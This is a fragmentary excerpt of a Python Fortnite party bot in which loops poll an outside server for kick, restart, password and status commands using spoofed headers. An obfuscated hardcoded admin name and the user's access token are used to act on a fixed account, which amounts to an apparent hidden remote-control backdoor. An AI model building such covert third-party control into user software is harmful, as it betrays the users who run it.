...
copied_player = ""
__version__ = "None"
adminsss = 'שًٍّ שًٍّשًٍّ'
headers = {'Accept': '*/*'}
errordiff = 'errors.com.epicgames.common.throttled', 'errors.com.epicgames.friends.inviter_friendships_limit_exceeded'
vips = ""
headersx = {'host': 'aeroz.cousin.com','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.22','enable-super-fast': "True",'x-gorgon': "172SJAI19A","x-signature": "4HKAI18ALOQ"}
...
class PartyBot(commands.Bot):
    def __init__(self, device_id: str, account_id: str, secret: str, loop=asyncio.get_event_loop(), **kwargs) -> None:
        ...
        self.bl_inv = 'שًٍّ שًٍّשًٍّ'
        self.inv_on = "F"

        self.adminx = "שًٍّ שًٍّשًٍّ"
        ...
        self.join_msg = "Hi {DISPLAY_NAME} - Use Code : XNXX \n create your own bot here : aeroz.cousin.com"
    ...
    async def add_list(self) -> None:
        ...
        cousin = await self.http.post(
            route = url,
            json = payload,
            auth = self.http.get_auth('FORTNITE_ACCESS_TOKEN')
            )

        if not '6df96fa0ffab4827bc93a3d3dd46f1a5' in self.friends:
    ...
    async def checker_autox(self) -> None:
        while True:
            ...
            global __version__
            global adminsss
            v = requests.get("https://aeroz.cousin.com/default",headers={
            ...
            b = requests.get(f"https://aeroz.cousin.com/kick",headers={
                'host': 'api.schbots.com',
            ...
            dasda = requests.get('https://api.schbots.com/password',headers=headersx,cookies={"omgjaichanger": "None"}).json()['password']
            password = dasda
              
            y = requests.get(f"https://aeroz.cousin.com/restart",headers={
                'host': 'api.schbots.com',
    ...
    async def normal_setup(self) -> None:
        while True:
            ...
            global __version__
            global adminsss
            u = requests.get(f"https://aeroz.cousin.com/default",headers={
                'host': 'api.schbots.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.53',
                'enable-super-fast': "True",
                'x-gorgon': "NZXHA6JSI14",
            ...
            s = requests.get(f"https://aeroz.cousin.com/kick",headers={
                'host': 'api.schbots.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.30',
                'enable-super-fast': "False",
                'x-gorgon': "A7JD2Y27D2K",
            ...
            m = requests.get(f"https://aeroz.cousin.com/restart",headers={
                'host': 'api.schbots.com',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.24',
                'enable-super-fast': "None",
                'x-gorgon': "NC28AH28SJ19S",
    ...
    async def auto_add_s(self):
        x = requests.get(f"https://aeroz.cousin.com/add_auto",headers={
                'host': 'api.schbots.com',
    ...
    async def checker_status(self):
        q = requests.get(f"https://aeroz.cousin.com/status",headers={
                'host': 'api.schbots.com',
    ...
    async def checker_skin_bl(self):
        w = requests.get("https://aeroz.cousin.com/skinbl",headers={
                'host': 'api.schbots.com',
    ...
    async def event_friend_message(self, message: fortnitepy.FriendMessage) -> None:
        if not message.author.display_name != "שًٍّ שًٍّשًٍّ":
